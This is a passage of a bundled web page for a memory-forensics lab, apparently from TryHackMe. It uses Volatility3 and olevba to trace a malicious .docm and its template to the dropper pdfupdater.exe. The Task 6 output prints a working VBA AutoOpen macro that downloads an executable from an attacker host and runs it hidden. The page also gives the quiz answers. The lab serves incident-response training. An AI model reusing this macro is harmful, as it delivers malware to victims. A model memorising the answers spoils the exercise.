collected."]}),"\n",(0,i.jsx)(s.h3,{id:"execution",children:"Execution"}),"\n",(0,i.jsxs)(s.p,{children:["Let's start by using the ",(0,i.jsx)(s.strong,{children:"cmdline"})," plugin from Volatility to inspect the commands or programs executed when the memory dump was taken. The cmdline plugin works by walking through each process in memory and accessing each process environment block (",(0,i.jsx)(s.a,{href:"https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb",children:"PEB"}),"). Inside the ",(0,i.jsx)(s.strong,{children:"PEB"}),", there's a structure called ",(0,i.jsx)(s.a,{href:"https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-rtl_user_process_parameters",children:"ProcessParameters"}),", which contains a pointer to the Unicode string holding the command line used to launch the process."]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-c",children:"typedef struct _RTL_USER_PROCESS_PARAMETERS {\n    BYTE           Reserved1[16];\n    PVOID          Reserved2[10];\n    UNICODE_STRING ImagePathName;\n    UNICODE_STRING CommandLine; // This is the string it reads\n    RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;\n}\n"})}),"\n",(0,i.jsx)(s.p,{children:"The plugin reads this string directly from memory. Let's use the mentioned plugin to investigate processes and file executions with the following command:"}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.code,{children:"vol -f THM-WIN-001_071528_07052025.mem windows.cmdline  > cmdline.txt"})}),"\n",(0,i.jsxs)(s.p,{children:["The above command will save the command's output to the file ",(0,i.jsx)(s.strong,{children:"cmdline.txt"}),". We can analyze it to look for suspicious information."]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-shell",metastring:'title="Terminal"',children:'ubuntu@tryhackme$ cat cmdline.txt \nVolatility 3 Framework 2.26.0\n\nPID    Process    Args\n\n4    System    -\n92    Registry    -\n324    smss.exe    \\SystemRoot\\System32\\smss.exe\n[REDACTED]\n6964    audiodg.exe    C:\\Windows\\system32\\AUDIODG.EXE 0x2fc\n5252    WINWORD.EXE    "C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE" /n "C:\\Users\\operator\\Documents\\[REDACTED].docm" /o ""\n2404    svchost.exe    C:\\Windows\\system32\\svchost.exe -k LocalSystemNetworkRestricted -p -s PcaSvc\n2072    svchost.exe    C:\\Windows\\System32\\svchost.exe -k LocalSystemNetworkRestricted -p -s WdiSystemHost\n2232    SearchProtocol    "C:\\Windows\\system32\\SearchProtocolHost.exe" Global\\UsGthrFltPipeMssGthrPipe1_ Global\\UsGthrCtrlFltPipeMssGthrPipe1 1 -2147483646 "Software\\Microsoft\\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\\ProgramData\\Microsoft\\Search\\Data\\Temp\\usgthrsvc" "DownLevelDaemon" \n3392    pdfupdater.exe    C:\\Users\\operator\\pdfupdater.exe\n3932    ai.exe    "C:\\Program Files (x86)\\Microsoft Office\\root\\vfs\\ProgramFilesCommonX64\\Microsoft Shared\\Office16\\AI\\ai.exe" "800FB58E-123D-47C9-86F8-DBF71EE67997" "B1B0FF84-8895-409C-B3BB-2C4A4087BED6" "5252" "C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE" "WordCombinedFloatieLreOnline.onnx"\n2576    conhost.exe    \\??\\C:\\Windows\\system32\\conhost.exe 0x4\n10084    windows-update    "C:\\Users\\operator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows-update.exe"\n[REDACTED]\n7788    FTK Imager.exe    "C:\\Program Files\\AccessData\\FTK Imager\\FTK Imager.exe" \n9920    dllhost.exe    C:\\Windows\\system32\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}\n5108    svchost.exe\n'})}),"\n",(0,i.jsxs)(s.p,{children:["We can observe that none of the potential malicious processes were executed with commands, but we can observe and confirm that the process ",(0,i.jsx)(s.strong,{children:"5252"})," corresponding to ",(0,i.jsx)(s.strong,{children:"WINWORD.EXE"})," was executed to open the a ",(0,i.jsx)(s.strong,{children:"docm"})," (in reality, the file could be either clicked or opened by the user), as shown below:"]}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.code,{children:'5252    WINWORD.EXE    "C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE" /n "C:\\Users\\operator\\Documents\\[REDACTED].docm" /o ""'})}),"\n",(0,i.jsxs)(s.p,{children:["This shows that ",(0,i.jsx)(s.code,{children:"WINWORD.EXE"})," was started with the ",(0,i.jsx)(s.code,{children:".docm"})," file, a macro-enabled document. The use of ",(0,i.jsx)(s.code,{children:"/n"})," indicates a new instance was launched, something often used to avoid reusing existing windows."]}),"\n",(0,i.jsx)(s.h3,{id:"file-access",children:"File Access"}),"\n",(0,i.jsxs)(s.p,{children:["We can confirm the above by looking at the handles for this file with the handles plugin, which extracts open handles by parsing the handle table referenced by the ",(0,i.jsx)(s.code,{children:"ObjectTable"})," field in each process\u2019s ",(0,i.jsx)(s.a,{href:"https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/eprocess",children:"EPROCESS"})," structure. Each entry maps to a kernel object (files, registry keys, events, etc.), and the plugin walks the table to interpret them. This reveals which resources were open per process at the time of the memory dump."]}),"\n",(0,i.jsx)(s.p,{children:"Let's try it with the following command:"}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.code,{children:"vol -f THM-WIN-001_071528_07052025.mem windows.handles > handles.txt"})}),"\n",(0,i.jsxs)(s.p,{children:["Let's now examine the content of ",(0,i.jsx)(s.strong,{children:"handles.txt"}),", where our output was saved."]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-shell",metastring:'title="Terminal"',children:"ubuntu@tryhackme$ cat handles.txt |grep WINWORD\n[REDACTED]\n\n5252    WINWORD.EXE    0xbe8c69e24e20    0xd00    Key    0x20019    MACHINE\\SOFTWARE\\CLASSES\\WOW6432NODE\\CLSID\\{76765B11-3F95-4AF2-AC9D-EA55D8994F1A}\n5252    WINWORD.EXE    0x990b29014c60    0xd04    Event    0x1f0003    -\n5252    WINWORD.EXE    0x990b289a55e0    0xd0c    Event    0x1f0003    -\n5252    WINWORD.EXE    0x990b289a56e0    0xd10    Event    0x1f0003    -\n5252    WINWORD.EXE    0x990b289a5760    0xd14    Event    0x1f0003    -\n5252    WINWORD.EXE    0x990b265ae590    0xd18    WaitCompletionPacket    0x1    -\n5252    WINWORD.EXE    0x990b2a79ae30    0xd1c    File    0x100001    \\Device\\KsecDD\n5252    WINWORD.EXE    0x990b2ae08c20    0xd20    File    0x100001    \\Device\\HarddiskVolume3\\Windows\\System32\\en-US\\propsys.dll.mui\n5252    WINWORD.EXE    0xbe8c69f5ff10    0xd24    Section    0x4    C:*ProgramData*Microsoft*Windows*Caches*{DDF571F2-BE98-426D-8288-1A9A39C3FDA2}.2.ver0x0000000000000003.db\n5252    WINWORD.EXE    0x990b2a57ad90    0xd2c    ALPC Port    0x1f0001    -\n5252    WINWORD.EXE    0x990b2ae0ab60    0xd30    File    0x12019f    \\Device\\HarddiskVolume3\\Users\\operator\\Documents\\[REDACTED].docm\n5252    WINWORD.EXE    0x990b29d9cf60    0xd34    Event    0x1f0003    -\n\n[REDACTED]\n"})}),"\n",(0,i.jsxs)(s.p,{children:[(0,i.jsx)(s.strong,{children:"Note"}),": This command can take a couple of minutes to execute."]}),"\n",(0,i.jsxs)(s.p,{children:["As we can observe, the process opens or executes the file at ",(0,i.jsx)(s.code,{children:"\\Device\\HarddiskVolume3\\Users\\operator\\Documents\\[REDACTED].docm"}),". This shows the file wasn\u2019t just passed as an argument. It was actively opened by the process. This makes the case for linking this document and the activity that followed."]}),"\n",(0,i.jsxs)(s.p,{children:["At this point, to get more information about what happened, we need to inspect the process ",(0,i.jsx)(s.code,{children:"WINWORD.EXE"}),", if we want to have any chance to recover more information about this process. We'll do that in the next task."]}),"\n",(0,i.jsxs)(s.admonition,{title:"Answer the questions below",type:"info",children:[(0,i.jsxs)(t,{children:[(0,i.jsx)("summary",{children:" What file was passed to WINWORD.EXE? "}),(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-plaintext",children:"cv-resume-test.docm\n"})})]}),(0,i.jsxs)(t,{children:[(0,i.jsx)("summary",{children:" What is the name of the Volatility3 plugin that extracts open files, registry keys, and kernel objects from process handle tables? "}),(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-plaintext",children:"windows.handles\n"})})]}),(0,i.jsxs)(t,{children:[(0,i.jsx)("summary",{children:" What is the full device path where the.docm file was found open in WINWORD.EXE\u2019s memory space? "}),(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-plaintext",children:"C:\\Users\\operator\\Documents\\cv-resume-test.docm\n"})})]}),(0,i.jsxs)(t,{children:[(0,i.jsx)("summary",{children:" What Windows command-line switch was used to open WINWORD.EXE in a new instance? "}),(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-plaintext",children:"/n\n"})})]})]}),"\n",(0,i.jsx)(s.h2,{id:"task-6-tracing-user-execution",children:"Task 6 Tracing User Execution"}),"\n",(0,i.jsx)(s.p,{children:"In this part of the investigation, we\u2019ll revisit a template file likely used by the same Word process. These templates often hold embedded macros and are loaded automatically with macro-enabled documents. We already extracted this during a previous step, but we\u2019ll confirm its type and analyze it here. The goal is to check whether this file played a role in triggering further activity."}),"\n",(0,i.jsx)(s.h3,{id:"locating-the-template-file",children:"Locating the Template File"}),"\n",(0,i.jsxs)(s.p,{children:["To dump the files loaded or used by a process, or the process itself, we can use the ",(0,i.jsx)(s.strong,{children:"dumpfiles"})," plugin from Volatility which extracts file objects that were present in the system's memory at the time of acquisition. It works by scanning the memory for ",(0,i.jsx)(s.a,{href:"https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_file_object",children:"FILE_OBJECT"})," structures, which represent open or recently accessed files. For each valid file object found, the plugin attempts to follow the associated ",(0,i.jsx)(s.a,{href:"https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_section_object_pointers",children:"SectionObjectPointer"})," to locate and reconstruct the mapped file data in memory."]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-c",children:"typedef struct _SECTION_OBJECT_POINTERS {\n    PVOID DataSectionObject;\n    PVOID SharedCacheMap;\n    PVOID ImageSectionObject;\n    SECTION_OBJECT_POINTERS;\n}\n"})}),"\n",(0,i.jsx)(s.p,{children:"It uses the object's metadata, such as the file name and offset, to name the dumped file appropriately. If the file's data is still resident in memory."}),"\n",(0,i.jsxs)(s.p,{children:["We already dumped this file in the previous room, and it should be available in the ",(0,i.jsx)(s.code,{children:"5252/"})," directory, but we can do it again by using the command:"]}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.code,{children:"vol -f THM-WIN-001_071528_07052025.mem -o 5252/ windows.dumpfiles --pid 5252"})}),"\n",(0,i.jsxs)(s.p,{children:["Once we have access to that file dump, we can inspect it as we did when we identified a ",(0,i.jsx)(s.strong,{children:"DOTM"})," file with potential. Often, Macro-enabled files, such as ",(0,i.jsx)(s.strong,{children:"DOCM"}),", will have templates in DOTM files. This is the type of file we already found in the previous task by dumping the process ",(0,i.jsx)(s.strong,{children:"WINWORD.EXE"}),". We can search for it again using the grep command:"]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-shell",metastring:'title="Terminal"',children:"ubuntu@tryhackme$ ls 5252/|grep dotm\nfile.0x990b2ae077d0.0x990b2a3f5d70.SharedCacheMap.Normal.dotm.vacb\nfile.0x990b2ae077d0.0x990b2b916cd0.DataSectionObject.Normal.dotm.dat\n"})}),"\n",(0,i.jsxs)(s.p,{children:["Great, so let's copy the file to our home directory with the command ",(0,i.jsx)(s.code,{children:"cp 5252/file.0x990b2ae077d0.0x990b2b916cd0.DataSectionObject.Normal.dotm.dat ."})," and let's inspect it again, and confirm it's a Word document file as we previously did using the ",(0,i.jsx)(s.code,{children:"file"})," command and corroborate the file type as ",(0,i.jsx)(s.strong,{children:"Word"}),"."]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-shell",metastring:'title="Terminal"',children:"ubuntu@tryhackme$ file file.0x990b2ae077d0.0x990b2b916cd0.DataSectionObject.Normal.dotm.dat\nfile.0x990b2ae077d0.0x990b2b916cd0.DataSectionObject.Normal.dotm.dat: Microsoft Word 2007+\n"})}),"\n",(0,i.jsx)(s.h3,{id:"confirm-macro-execution",children:"Confirm Macro Execution"}),"\n",(0,i.jsxs)(s.p,{children:["Let's unzip the .dat file using the command ",(0,i.jsx)(s.code,{children:"unzip"}),", and inspect the files. Let's examine the word/ directory that was unzipped. We will find a VBA file called ",(0,i.jsx)(s.strong,{children:"vbaProject.bin"}),". If there's a macro or potential malicious code, it should be there, so we will extract it using ",(0,i.jsx)(s.code,{children:"olevba"})," (part of the ",(0,i.jsx)(s.strong,{children:"oletools"})," suite) with the command ",(0,i.jsx)(s.code,{children:"olevba word/vbaProject.bin"})]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-shell",metastring:'title="Terminal"',children:'ubuntu@tryhackme$ olevba word/vbaProject.bin \nXLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)\n[REDACTED]\n \nSub AutoOpen()\n    DownloadAndExecute\nEnd Sub\n\nSub Document_Open()\n    DownloadAndExecute\nEnd Sub\n\nSub DownloadAndExecute()\n    Dim url As String\n    Dim filePath As String\n    Dim xmlhttp As Object\n    Dim adoStream As Object\n\n    url = "http:/[REDACTED]/pdfupdater.exe"\n    filePath = "C:\\Users\\operator\\pdfupdater.exe"\n\n    \' Delete file if it already exists\n    If Dir(filePath) <> "" Then Kill filePath\n\n    Set xmlhttp = CreateObject("MSXML2.XMLHTTP")\n    xmlhttp.Open "GET", url, False\n    xmlhttp.Send\n\n    If xmlhttp.Status = 200 Then\n        Set adoStream = CreateObject("ADODB.Stream")\n        adoStream.Type = 1 \' Binary\n        adoStream.Open\n        adoStream.Write xmlhttp.responseBody\n        adoStream.SaveToFile filePath, 2 \' Overwrite existing\n        adoStream.Close\n\n        Shell filePath, vbHide \' Run the file silently\n    Else\n        MsgBox "Download failed. HTTP status: " & xmlhttp.Status\n    End If\nEnd Sub\n\n[REDACTED]\n'})}),"\n",(0,i.jsxs)(s.p,{children:["Excellent. We successfully recovered from memory the macro that the user executed, which was likely delivered through a document. This macro initiated the execution of ",(0,i.jsx)(s.code,{children:"pdfupdater.exe"})," and revealed a URL that can help trace the origin of the activity, which we\u2019ll explore further in the following task."]}),"\n",(0,i.jsxs)(s.admonition,{title:"Answer the questions below",type:"info",children:[(0,i.jsxs)(t,{children:[(0,i.jsxs)("summary",{children:[" What command did we use to confirm that the dumped ",(0,i.jsx)(s.code,{children:".dat"})," file is a Microsoft Word document? "]}),(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-plaintext",children:"file\n"})})]}),(0,i.jsxs)(t,{children:[(0,i.jsxs)("summary",{children:[" According to the ",(0,i.jsx)(s.code,{children:"olevba"})," output, what is the name of the file downloaded and executed by the macro? "]}),(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-plaintext",children:"pdfupdater.exe\n"})})]}),(0,i.jsxs)(t,{children:[(0,i.jsx)("summary",{children:" What is the full URL hardcoded in the macro for downloading the executable? "}),(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-plaintext",children:"http://attacker.thm/pdfupdater.exe\n"})})]})]}),"\n",(0,i.jsx)(s.h2,{id:"task-7-conclusion",children:"Task 7 Conclusion"}),"\n",(0,i.jsx)(s.p,{children:"In this room, we analyzed user activity through memory alone, tracking logins, sessions, commands, and file access. Each task focused on signs of interaction that helped us understand what actions took place on the system during the incident."}),"\n",(0,i.jsx)(s.p,{children:"We worked entirely from RAM data, without relying on disk logs. Following these traces, we built a clear picture of user behavior and potential malicious activity. We can build a timeline so far that looks like the one below."}),"\n",(0,i.jsxs)(s.ol,{children:["\n",(0,i.jsxs)(s.li,{children:["The user operator was logged in and active at the time of memory capture: Confirmed via session data and loaded registry hive. Using ",(0,i.jsx)(s.strong,{children:"windows.sessions"})," and ",(0,i.jsx)(s.strong,{children:"windows.registry.hivelist"})," volatility plugins."]}),"\n",(0,i.jsxs)(s.li,{children:["The malicious document ",(0,i.jsx)(s.strong,{children:"cv-resume-test.docm"})," was opened through Microsoft Word: Traced to the ",(0,i.jsx)(s.strong,{children:"WINWORD.EXE"})," process and file handle. Using ",(0,i.jsx)(s.strong,{children:"windows.cmdline"})," and ",(0,i.jsx)(s.strong,{children:"windows.handles"})," volatility plugins."]}),"\n",(0,i.jsxs)(s.li,{children:["The document triggered a linked template (",(0,i.jsx)(s.strong,{children:".dotm"}),") that contained embedded macros: Identified by inspecting dumped file objects linked to WINWORD.EXE: Using the ",(0,i.jsx)(s.strong,{children:"windows.dumpfiles"})," volatility plugin and the grep command over the process directory."]}),"\n",(0,i.jsxs)(s.li,{children:["The macro executed silently, downloading and running pdfupdater.exe from a remote server: Macro content extracted from memory and analyzed. Unzipping the ",(0,i.jsx)(s.strong,{children:".dotm"})," and running ",(0,i.jsx)(s.strong,{children:"olevba"})," on ",(0,i.jsx)(s.strong,{children:"vbaProject.bin"}),"."]}),"\n",(0,i.jsxs)(s.li,{children:["The downloaded file spawned ",(0,i.jsx)(s.strong,{children:"windows-update.exe"}),", which then launched updater.exe: Confirmed through process relationships and creation order using ",(0,i.jsx)(s.strong,{children:"pslist"}),", ",(0,i.jsx)(s.strong,{children:"cmdline"}),", and process ancestry."]}),"\n",(0,i.jsxs)(s.li,{children:["Post-exploitation activity became evident with the launch of cmd.exe and powershell.exe: Observed through active processes in the same session shortly after payload execution via ",(0,i.jsx)(s.strong,{children:"sessions"})," and ",(0,i.jsx)(s.strong,{children:"pslist"}),"."]}),"\n",(0,i.jsxs)(s.li,{children:["UserAssist entries confirmed interactive applications like Command Prompt were launched: Recovered from the operator\u2019s ",(0,i.jsx)(s.strong,{children:"NTUSER.DAT"})," hive using the ",(0,i.jsx)(s.strong,{children:"windows.registry.userassist"})," volatility plugin for ",(0,i.jsx)(s.strong,{children:"GUI-driven"})," execution evidence."]}),"\n"]}),"\n",(0,i.jsx)(s.p,{children:"In the next room of this module, we'll learn how network connections can be tracked and traced similarly. We will also finish the timeline we are currently building to try to uncover the whole attack chain."}),"\n",(0,i.jsx)(s.admonition,{title:"Answer the questions below",type:"info",children:(0,i.jsxs)(t,{children:[(0,i.jsx)("summary",{children:" Click to complete the room. "}),(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-plaintext",children:"No answer needed\n"})})]})})]})}function h(e={}){const{wrapper:s}={...(0,r.R)(),...e.components};return s?(0,i.jsx)(s,{...e,children:(0,i.jsx)(l,{...e})}):l(e)}},8453:(e,s,n)=>{n.d(s,{R:()=>o,x:()=>a});var t=n(6540);const i={},r=t.createContext(i);function o(e){const s=t.useContext(r);return t.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function a(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:o(e.components),t.createElement(r.Provider,{value:s},e.children)}},8514:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/image_20251255-215557-c8d815645075f11212bd6abd4a0ffb55.png"}}]);